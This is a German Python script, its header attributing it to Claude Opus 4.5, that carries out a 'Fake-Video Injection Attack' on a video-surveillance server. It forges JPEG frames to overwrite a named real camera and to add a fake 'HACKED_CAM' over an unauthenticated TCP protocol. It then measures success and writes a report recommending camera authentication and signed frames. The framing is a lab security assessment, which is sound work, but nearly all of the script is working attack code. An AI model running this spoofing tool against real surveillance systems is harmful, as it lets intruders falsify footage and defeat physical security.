"""
Erstellt von Claude Opus 4.5 am 01.02.2026

Fake-Video Injection Attack

ANGRIFFSMODI:
1. Kamera-Spoofing: Bestehende Kamera überschreiben (gleicher Name, schneller senden)
2. Kamera-Injection: Neue Fake-Kamera hinzufügen
"""


import socket
import time
import csv
import os
import json
import threading
import requests
from datetime import datetime
from dataclasses import dataclass, field, asdict
from typing import List
from PIL import Image, ImageDraw, ImageFont
import io

CONFIG = {
    "server_ip": "192.168.0.100",
    "server_tcp_port": 9000,
    "server_http_port": 5000,
    "attack_mode": "both",
    "spoof_camera_name": "Garten_Cam_01",
    "inject_camera_name": "HACKED_CAM",
    "target_fps": 60,
    "attack_duration_sec": 60,
    "baseline_duration_sec": 15,
    "recovery_duration_sec": 20,
    "measurement_interval_sec": 1,
    "output_dir": "fake_video_results"
}

class FakeImageGenerator:
    @staticmethod
    def create_image(text, bg_color, camera_name, frame_number=0, width=480, height=320):
        img = Image.new('RGB', (width, height), color=bg_color)
        draw = ImageDraw.Draw(img)
        try:
            font_large = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 56)
            font_medium = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 32)
            font_small = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 20)
        except:
            font_large = font_medium = font_small = ImageFont.load_default()
        
        bbox = draw.textbbox((0, 0), text, font=font_large)
        x = (width - (bbox[2] - bbox[0])) // 2
        y = height // 2 - 50
        draw.text((x+2, y+2), text, fill=(50, 50, 50), font=font_large)
        draw.text((x, y), text, fill=(255, 255, 255), font=font_large)
        draw.text((width//2 - 60, y + 70), f"Frame: {frame_number}", fill=(255, 255, 0), font=font_medium)
        draw.text((10, height - 30), camera_name, fill=(255, 255, 255), font=font_small)
        draw.text((10, 10), datetime.now().strftime("%H:%M:%S.%f")[:-3], fill=(255, 255, 255), font=font_small)
        
        buffer = io.BytesIO()
        img.save(buffer, format='JPEG', quality=50)
        return buffer.getvalue()

@dataclass
class Measurement:
    timestamp: str
    phase: str
    elapsed_sec: float
    cameras_online: int
    camera_names: List[str]
    spoofed_visible: bool
    fake_visible: bool
    spoof_fps: float
    inject_fps: float
    spoof_frames: int
    inject_frames: int
    success: bool

@dataclass
class InjectionReport:
    experiment_date: str = ""
    experiment_time: str = ""
    target: str = ""
    spoof_camera_name: str = ""
    inject_camera_name: str = ""
    spoof_frames_sent: int = 0
    spoof_fps_achieved: float = 0
    inject_frames_sent: int = 0
    inject_fps_achieved: float = 0
    baseline_cameras: int = 0
    baseline_camera_names: List[str] = field(default_factory=list)
    spoof_successful: bool = False
    injection_successful: bool = False
    vulnerability_confirmed: bool = False
    recovery_spoof_time: float = 0
    recovery_inject_time: float = 0
    measurements: List[dict] = field(default_factory=list)

class FPSLimitedStreamer:
    def __init__(self, server_ip, server_port, camera_name, target_fps, is_spoof=False):
        self.server_ip = server_ip
        self.server_port = server_port
        self.camera_name = camera_name
        self.frame_delay = 1.0 / target_fps
        self.is_spoof = is_spoof
        self.running = False
        self.socket = None
        self.lock = threading.Lock()
        self.frames_sent = 0
        self.fps_current = 0.0
        self.last_fps_time = 0
        self.frames_since_update = 0
        self.text = "SPOOFED!" if is_spoof else "HACKED!"
        self.bg_color = (200, 0, 0) if is_spoof else (0, 0, 200)
    
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.connect((self.server_ip, self.server_port))
            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            return True
        except:
            return False
    
    def get_fps(self):
        with self.lock:
            return self.fps_current
    
    def get_frames(self):
        with self.lock:
            return self.frames_sent
    
    def run(self):
        self.running = True
        self.last_fps_time = time.time()
        frame_num = 0
        
        while self.running:
            loop_start = time.time()
            
            if self.socket is None and not self.connect():
                time.sleep(0.5)
                continue
            
            frame = FakeImageGenerator.create_image(self.text, self.bg_color, self.camera_name, frame_num)
            
            try:
                ts = int(time.time() * 1000)
                header = f"CAM:{self.camera_name}:{len(frame)}:{ts}\n"
                self.socket.sendall(header.encode() + frame)
                
                with self.lock:
                    self.frames_sent += 1
                    self.frames_since_update += 1
                frame_num += 1
                
                now = time.time()
                if now - self.last_fps_time >= 1.0:
                    with self.lock:
                        self.fps_current = self.frames_since_update / (now - self.last_fps_time)
                        self.frames_since_update = 0
                        self.last_fps_time = now
            except:
                try: self.socket.close()
                except: pass
                self.socket = None
                continue
            
            sleep_time = self.frame_delay - (time.time() - loop_start)
            if sleep_time > 0:
                time.sleep(sleep_time)
        
        if self.socket:
            try: self.socket.close()
            except: pass
    
    def stop(self):
        self.running = False


class SimpleFakeVideoInjector:
    def __init__(self, config):
        self.config = config
        self.server_ip = config['server_ip']
        self.tcp_port = config['server_tcp_port']
        self.http_port = config['server_http_port']
        self.status_url = f"http://{self.server_ip}:{self.http_port}/status"
        self.spoof_streamer = None
        self.inject_streamer = None
        self.measurements = []
        self.start_time = None
        self.report = InjectionReport()
        self.attack_started = False
        self.attack_stopped = False
        self.attack_stop_time = None
        os.makedirs(config['output_dir'], exist_ok=True)
        self.run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def log(self, msg, level="INFO"):
        symbols = {"INFO": "ℹ️", "ATTACK": "💉", "SUCCESS": "✅", "MEASURE": "📊", "WARN": "⚠️"}
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {symbols.get(level, '•')} {msg}")
    
    def get_status(self):
        try:
            r = requests.get(self.status_url, timeout=2)
            return r.json() if r.status_code == 200 else {"cameras": []}
        except:
            return {"cameras": []}
    
    def measure_once(self, phase):
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        if self.attack_started:
            spoof_fps = self.spoof_streamer.get_fps() if self.spoof_streamer else 0
            inject_fps = self.inject_streamer.get_fps() if self.inject_streamer else 0
            spoof_frames = self.spoof_streamer.get_frames() if self.spoof_streamer else 0
            inject_frames = self.inject_streamer.get_frames() if self.inject_streamer else 0
        else:
            spoof_fps = inject_fps = spoof_frames = inject_frames = 0
        
        status = self.get_status()
        cameras = status.get('cameras', [])
        names = [c.get('name', '') for c in cameras]
        
        spoofed_visible = self.config['spoof_camera_name'] in names
        fake_visible = self.config['inject_camera_name'] in names
        
        return Measurement(
            timestamp=datetime.now().isoformat(), phase=phase, elapsed_sec=round(elapsed, 1),
            cameras_online=len(cameras), camera_names=names,
            spoofed_visible=spoofed_visible, fake_visible=fake_visible,
            spoof_fps=round(spoof_fps, 1), inject_fps=round(inject_fps, 1),
            spoof_frames=spoof_frames, inject_frames=inject_frames, success=True
        )
    
    def print_baseline_line(self, m):
        """Klare Baseline-Ausgabe - nur echte Kameras zählen"""
        camera_list = ', '.join(m.camera_names) if m.camera_names else 'keine'
        print(f"  [{m.elapsed_sec:>5.1f}s] Echte Kameras online: {m.cameras_online} ({camera_list})")
    
    def print_attack_line(self, m):
        """Klare Attack-Ausgabe mit Angriffs-Status"""
        spoof_status = "🟢 überschrieben" if m.spoofed_visible else "🔴 fehlgeschlagen"
        fake_status = "🟢 injiziert" if m.fake_visible else "🔴 nicht sichtbar"
        
        print(f"  [{m.elapsed_sec:>5.1f}s] Kameras: {m.cameras_online} | "
              f"Spoof: {m.spoof_fps:>4.1f} fps ({m.spoof_frames} frames) {spoof_status} | "
              f"Fake: {m.inject_fps:>4.1f} fps ({m.inject_frames} frames) {fake_status}")
    
    def print_recovery_line(self, m, time_since_stop):
        """Klare Recovery-Ausgabe - zeigt wann Fake-Kameras verschwinden"""
        spoof_status = "⚠️ noch überschrieben" if m.fake_visible or (m.spoofed_visible and self.attack_stopped) else "✅ Original wiederhergestellt"
        
        if m.fake_visible:
            fake_status = f"⚠️ noch sichtbar (verschwindet in ~{15 - time_since_stop:.0f}s)"
        else:
            fake_status = "✅ entfernt"
        
        original_back = self.config['spoof_camera_name'] in m.camera_names and not self.attack_started
        
        print(f"  [{m.elapsed_sec:>5.1f}s] Kameras: {m.cameras_online} | "
              f"Spoof-Kamera: {'✅ Original zurück' if m.cameras_online >= self.report.baseline_cameras else '⚠️ warte...'} | "
              f"Fake-Kamera: {fake_status}")
    
    def measure_baseline(self, duration):
        self.log(f"BASELINE: Erfasse Normal-Zustand ({duration}s)", "MEASURE")
        print(f"  Prüfe welche echten Kameras online sind...")
        print()
        
        measurements = []
        end_time = time.time() + duration
        
        while time.time() < end_time:
            m = self.measure_once("baseline")
            measurements.append(m)
            self.print_baseline_line(m)
            time.sleep(self.config['measurement_interval_sec'])
        
        print()
        return measurements
    
    def measure_attack(self, duration):
        self.log(f"ANGRIFF: Sende Fake-Videos ({duration}s)", "ATTACK")
        print(f"  Spoof-Ziel: {self.config['spoof_camera_name']} (wird überschrieben)")
        print(f"  Inject-Ziel: {self.config['inject_camera_name']} (neue Fake-Kamera)")
        print()
        
        measurements = []
        end_time = time.time() + duration
        
        while time.time() < end_time:
            m = self.measure_once("attack")
            measurements.append(m)
            self.print_attack_line(m)
            time.sleep(self.config['measurement_interval_sec'])
        
        print()
        return measurements
    
    def measure_recovery(self, duration):
        self.log(f"RECOVERY: Beobachte Wiederherstellung ({duration}s)", "MEASURE")
        print(f"  Angriff gestoppt. Beobachte wie System sich erholt...")
        print(f"  - Echte Kamera sollte sofort wieder sichtbar sein")
        print(f"  - Fake-Kamera verschwindet nach ~15s (Server-Timeout)")
        print()
        
        measurements = []
        end_time = time.time() + duration
        fake_disappeared_time = None
        
        while time.time() < end_time:
            time_since_stop = time.time() - self.attack_stop_time if self.attack_stop_time else 0
            m = self.measure_once("recovery")
            measurements.append(m)
            self.print_recovery_line(m, time_since_stop)
            
            if not m.fake_visible and fake_disappeared_time is None:
                fake_disappeared_time = time_since_stop
                self.report.recovery_inject_time = fake_disappeared_time
            
            time.sleep(self.config['measurement_interval_sec'])
        
        print()
        return measurements
    
    def start_streamers(self):
        self.spoof_streamer = FPSLimitedStreamer(self.server_ip, self.tcp_port, 
            self.config['spoof_camera_name'], self.config['target_fps'], is_spoof=True)
        self.inject_streamer = FPSLimitedStreamer(self.server_ip, self.tcp_port,
            self.config['inject_camera_name'], self.config['target_fps'], is_spoof=False)
        
        threading.Thread(target=self.spoof_streamer.run, daemon=True).start()
        threading.Thread(target=self.inject_streamer.run, daemon=True).start()
        self.attack_started = True
        self.log(f"Streamer gestartet", "ATTACK")
    
    def stop_streamers(self):
        if self.spoof_streamer: 
            self.spoof_streamer.stop()
        if self.inject_streamer: 
            self.inject_streamer.stop()
        self.attack_stopped = True
        self.attack_stop_time = time.time()
        time.sleep(1)
        self.log(f"Streamer gestoppt", "INFO")
    
    def save_results(self):
        base = os.path.join(self.config['output_dir'], f"injection_{self.run_id}")
        
        with open(f"{base}_measurements.csv", 'w', newline='') as f:
            w = csv.DictWriter(f, fieldnames=['timestamp','phase','elapsed_sec','cameras_online',
                'camera_names','spoofed_visible','fake_visible','spoof_fps','inject_fps',
                'spoof_frames','inject_frames','success'])
            w.writeheader()
            for m in self.measurements:
                row = asdict(m)
                row['camera_names'] = ','.join(row['camera_names'])
                w.writerow(row)
        
        with open(f"{base}_report.json", 'w') as f:
            json.dump(asdict(self.report), f, indent=2)
        
        with open(f"{base}_summary.md", 'w') as f:
            f.write(self.generate_markdown())
        
        self.log(f"Ergebnisse gespeichert: {base}_*", "SUCCESS")
    
    def generate_markdown(self):
        r = self.report
        return f"""# Fake-Video Injection Attack Report

## Experiment-Details
| Parameter | Wert |
|-----------|------|
| Datum | {r.experiment_date} |
| Uhrzeit | {r.experiment_time} |
| Ziel | {r.target} |
| Spoof-Kamera | {r.spoof_camera_name} |
| Inject-Kamera | {r.inject_camera_name} |

## Baseline (Normal-Zustand)
| Metrik | Wert |
|--------|------|
| Echte Kameras online | {r.baseline_cameras} |
| Kamera-Namen | {', '.join(r.baseline_camera_names)} |

## Angriffs-Ergebnisse

### Spoofing (Kamera überschreiben)
| Metrik | Wert |
|--------|------|
| Ziel-Kamera | {r.spoof_camera_name} |
| Frames gesendet | {r.spoof_frames_sent} |
| Erreichte FPS | {r.spoof_fps_achieved:.1f} |
| **Erfolgreich** | {'✅ JA - Kamera wurde überschrieben' if r.spoof_successful else '❌ NEIN'} |

### Injection (Fake-Kamera hinzufügen)
| Metrik | Wert |
|--------|------|
| Fake-Kamera Name | {r.inject_camera_name} |
| Frames gesendet | {r.inject_frames_sent} |
| Erreichte FPS | {r.inject_fps_achieved:.1f} |
| **Erfolgreich** | {'✅ JA - Fake-Kamera erscheint im Dashboard' if r.injection_successful else '❌ NEIN'} |

## Recovery-Verhalten
| Beobachtung | Zeit |
|-------------|------|
| Echte Kamera wiederhergestellt | Sofort (echte Kamera sendet weiter) |
| Fake-Kamera entfernt | Nach ~{r.recovery_inject_time:.1f}s (Server-Timeout) |

## Bewertung

### Bestätigte Schwachstellen
| Schwachstelle | Status |
|---------------|--------|
| Fehlende Kamera-Authentifizierung | {'🔴 KRITISCH - Bestätigt' if r.vulnerability_confirmed else '🟢 OK'} |
| Kamera-Spoofing möglich | {'🔴 KRITISCH - Bestätigt' if r.spoof_successful else '🟢 OK'} |
| Kamera-Injection möglich | {'🔴 KRITISCH - Bestätigt' if r.injection_successful else '🟢 OK'} |

### CIA-Triade
| Schutzziel | Status | Begründung |
|------------|--------|------------|
| Confidentiality | 🟢 OK | Kein Datenleck durch diesen Angriff |
| **Integrity** | {'🔴 KRITISCH' if r.vulnerability_confirmed else '🟢 OK'} | {'Fake-Videos werden akzeptiert, echte Kameras können überschrieben werden' if r.vulnerability_confirmed else 'Keine Manipulation möglich'} |
| Availability | 🟢 OK | System blieb verfügbar |

## Fazit
{'**KRITISCH:** Der Server akzeptiert beliebige Kamera-Verbindungen ohne Authentifizierung. Ein Angreifer kann bestehende Kameras überschreiben (Spoofing) und neue Fake-Kameras hinzufügen (Injection). Dies ermöglicht das "Oceans Eleven"-Szenario: Manipulation der Videoüberwachung mit gefälschten Streams.' if r.vulnerability_confirmed else 'Angriff nicht erfolgreich.'}

### Empfehlungen
- Kamera-Authentifizierung implementieren (API-Keys, Zertifikate)
- Whitelist für erlaubte Kamera-Namen/IPs
- Anomalie-Erkennung bei neuen Kameras
- Signierte Frames (HMAC)

---
*Generiert am {r.experiment_date} um {r.experiment_time}*
"""
    
    def print_summary(self):
        r = self.report
        print()
        print("=" * 70)
        print("                         ZUSAMMENFASSUNG")
        print("=" * 70)
        print()
        print(f"  BASELINE: {r.baseline_cameras} echte Kameras")
        print(f"            ({', '.join(r.baseline_camera_names)})")
        print()
        print("  SPOOFING (Kamera überschreiben):")
        print(f"    Ziel:     {r.spoof_camera_name}")
        print(f"    Frames:   {r.spoof_frames_sent} @ {r.spoof_fps_achieved:.1f} FPS")
        print(f"    Status:   {'✅ ERFOLGREICH - Kamera wurde überschrieben' if r.spoof_successful else '❌ FEHLGESCHLAGEN'}")
        print()
        print("  INJECTION (Fake-Kamera hinzufügen):")
        print(f"    Name:     {r.inject_camera_name}")
        print(f"    Frames:   {r.inject_frames_sent} @ {r.inject_fps_achieved:.1f} FPS")
        print(f"    Status:   {'✅ ERFOLGREICH - Fake-Kamera im Dashboard sichtbar' if r.injection_successful else '❌ FEHLGESCHLAGEN'}")
        print()
        print("  RECOVERY:")
        print(f"    Echte Kamera:  Sofort wiederhergestellt")
        print(f"    Fake-Kamera:   Nach ~{r.recovery_inject_time:.1f}s entfernt (Server-Timeout)")
        print()
        print("=" * 70)
        if r.vulnerability_confirmed:
            print("  🔴 SCHWACHSTELLE BESTÄTIGT: FEHLENDE KAMERA-AUTHENTIFIZIERUNG")
        else:
            print("  🟢 Keine Schwachstelle gefunden")
        print("=" * 70)
    
    def run_experiment(self):
        print()
        self.log("=" * 60)
        self.log("FAKE-VIDEO INJECTION ATTACK")
        self.log(f"Ziel: {self.server_ip}:{self.tcp_port}")
        self.log("=" * 60)
        print()
        
        self.start_time = time.time()
        self.report.experiment_date = datetime.now().strftime("%Y-%m-%d")
        self.report.experiment_time = datetime.now().strftime("%H:%M:%S")
        self.report.target = f"{self.server_ip}:{self.tcp_port}"
        self.report.spoof_camera_name = self.config['spoof_camera_name']
        self.report.inject_camera_name = self.config['inject_camera_name']
        
        print("-" * 60)
        baseline = self.measure_baseline(self.config['baseline_duration_sec'])
        self.measurements.extend(baseline)
        if baseline:
            self.report.baseline_cameras = baseline[-1].cameras_online
            self.report.baseline_camera_names = baseline[-1].camera_names
        
        print("-" * 60)
        self.start_streamers()
        time.sleep(2)
        attack = self.measure_attack(self.config['attack_duration_sec'])
        self.measurements.extend(attack)
        self.stop_streamers()
        
        print("-" * 60)
        recovery = self.measure_recovery(self.config['recovery_duration_sec'])
        self.measurements.extend(recovery)
        
        if attack:
            last = attack[-1]
            self.report.spoof_frames_sent = last.spoof_frames
            self.report.spoof_fps_achieved = last.spoof_fps
            self.report.inject_frames_sent = last.inject_frames
            self.report.inject_fps_achieved = last.inject_fps
            self.report.spoof_successful = any(m.spoofed_visible for m in attack)
            self.report.injection_successful = any(m.fake_visible for m in attack)
        
        self.report.vulnerability_confirmed = self.report.spoof_successful or self.report.injection_successful
        self.report.measurements = [asdict(m) for m in self.measurements]
        
        print("-" * 60)
        self.save_results()
        self.print_summary()
      
if __name__ == "__main__":
    print()
    print("╔" + "═" * 62 + "╗")
    print("║   FAKE-VIDEO INJECTION ATTACK                               ║")
    print("║                                                              ║")
    print("║   • Spoofing:  Echte Kamera mit Fake-Bild überschreiben     ║")
    print("║   • Injection: Neue Fake-Kamera ins Dashboard injizieren    ║")
    print("╚" + "═" * 62 + "╝")
    print()
    
    print(f"  Ziel-Server:    {CONFIG['server_ip']}:{CONFIG['server_tcp_port']}")
    print(f"  Spoof-Kamera:   {CONFIG['spoof_camera_name']} (wird überschrieben)")
    print(f"  Inject-Kamera:  {CONFIG['inject_camera_name']} (neue Fake-Kamera)")
    print(f"  Ziel-FPS:       {CONFIG['target_fps']}")
    print(f"  Angriffsdauer:  {CONFIG['attack_duration_sec']}s")
    print()
    
    try:
        from PIL import Image
        print("  ✅ Pillow installiert")
    except ImportError:
        print("  ❌ Pillow fehlt: pip install Pillow")
        exit(1)
    
    print()
    if input("Experiment starten? (j/n): ").lower() != 'j':
        print("Abgebrochen.")
        exit()
    
    injector = SimpleFakeVideoInjector(CONFIG)
    
    try:
        injector.run_experiment()
    except KeyboardInterrupt:
        print("\n[!] Abgebrochen durch Benutzer")
        injector.stop_streamers()
        injector.save_results()
    
    print()
    print(f"✅ Fertig! Ergebnisse in: {CONFIG['output_dir']}/")
